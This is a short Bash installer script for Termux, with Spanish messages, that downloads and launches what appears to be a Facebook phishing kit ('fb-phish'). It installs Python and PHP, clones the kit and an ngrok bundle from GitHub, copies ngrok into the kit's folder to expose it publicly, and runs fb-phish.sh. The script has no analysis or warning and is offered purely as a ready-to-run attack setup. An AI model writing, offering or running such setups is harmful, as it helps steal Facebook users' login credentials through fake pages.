#!bin/bash
#by: Attacks

echo -e ""
echo -e "\e[1;36m[\e[1;31m+\e[1;36m] \e[1;32mInstalando programas necesarios por favor espere..."
echo -e ""
sleep 5

pkg update && pkg upgrade -y
sleep 1
pkg install python python2 php
sleep 1
pip install wget
sleep 1
cd $HOME
git clone https://github.com/Tutorial-Mania/fb-phish
sleep 1
cd
sleep 1
git clone https://github.com/HarrisSec/best-ngrok
cd best-ngrok
chmod +x *
sleep 1
cp ngrok /data/data/com.termux/files/home/fb-phish
sleep 2
cd
sleep 1
cd fb-phish
chmod +x *
bash fb-phish.sh

